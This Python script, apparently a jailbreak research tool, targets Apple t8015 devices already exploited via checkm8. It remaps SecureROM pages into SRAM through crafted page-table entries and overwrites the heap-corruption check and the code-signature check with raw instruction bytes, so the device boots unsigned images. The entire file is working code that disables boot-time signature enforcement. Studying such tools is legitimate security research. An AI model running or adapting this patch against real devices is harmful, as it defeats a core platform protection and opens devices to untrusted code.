import dfu
import usbexec
import sys
import usb.core
import struct
import binascii

HOST2DEVICE = 0x21
DEVICE2HOST = 0xA1

DFU_DNLOAD = 1
DFU_ABORT = 4


REMAP_PAGE  = 0x000000010000c000 #heapcheck
REMAP_PAGE2 = 0x0000000100004000 #sigcheck

SRAM_PAGETABLE_PAGE = 0x0000000180014000 #works

SRAM_REMAP_PAGE  = 0x00000001801f8000
SRAM_REMAP_PAGE2 = 0x00000001801f4000

PAGE_SIZE = 0x4000

def makePTE_Page_16K(addr):
    addr >>= 14
    e = 0b11            #valid and isPage
    e |= 1      << 2    #attrIndex 1
    e |= 0b10   << 6    #AP R- in EL1, -- in EL0
    e |= 1      << 10   #AF
    e |= addr   << 14   #outputAddress
    return e

def makePTE_Table_16K(addr):
    addr >>= 14
    e = 0b11            #valid and isTable
    e |= addr   << 14   #outputAddress
    return e


def main():
    print ("*** SecureROM t8015 sigcheckpath by tihmstar ***")
    device = dfu.acquire_device()
    print ("Found:", device.serial_number)
    if not "PWND:[" in device.serial_number:
        print ("Please enable pwned DFU Mode first.")
        sys.exit(1)
    if not "PWND:[checkm8]" in device.serial_number:
        print ("Only devices pwned using checkm8 are supported.")
        sys.exit(1)
    dfu.release_device(device)

    device = usbexec.PwnedUSBDevice()

    #make Level3 Table
    l3table = ""
    for addr in range(0x0000000100000000,0x0000000100100000,PAGE_SIZE):
        entry = struct.pack("<Q",makePTE_Page_16K(addr))
        if addr == REMAP_PAGE: #we are remapping heapcheck page
            entry = struct.pack("<Q",makePTE_Page_16K(SRAM_REMAP_PAGE))
        elif addr == REMAP_PAGE2: #we are remapping sigcheck page
            entry = struct.pack("<Q",makePTE_Page_16K(SRAM_REMAP_PAGE2))
        l3table += entry

    #we write L3 Table here
    device.write_memory(SRAM_PAGETABLE_PAGE,l3table)

    #remap heapcheck page to sram
    device.memcpy(SRAM_REMAP_PAGE,REMAP_PAGE,PAGE_SIZE)

    #remap sigcheck page to sram
    device.memcpy(SRAM_REMAP_PAGE2,REMAP_PAGE2,PAGE_SIZE)

    # patch heap corruption check
    device.write_memory(0x000000010000db98-REMAP_PAGE+SRAM_REMAP_PAGE,"\xC0\x03\x5F\xD6")

    #patch codesigs
    device.write_memory(0x000000010000624c-REMAP_PAGE2+SRAM_REMAP_PAGE2,"\x00\x00\x80\xD2")

    #L2 Table point to L3
    device.write_memory(0x000000018000c400,struct.pack("<Q",makePTE_Table_16K(SRAM_PAGETABLE_PAGE)))

    #memory barrier
    device.execute(0,0x1000004F0)

    #flush tlb
    device.execute(0,0x1000004AC)


    print("done remapping and patching page")
    device = dfu.acquire_device()

    device.ctrl_transfer(HOST2DEVICE, DFU_ABORT, 0, 0, 0, 0)
    # Perform USB reset
    try:
        dfu.usb_reset(device)
        dfu.release_device(device)
    except:
        pass
    print ("Device is now ready to accept unsigned images")


if __name__ == "__main__":
	main()
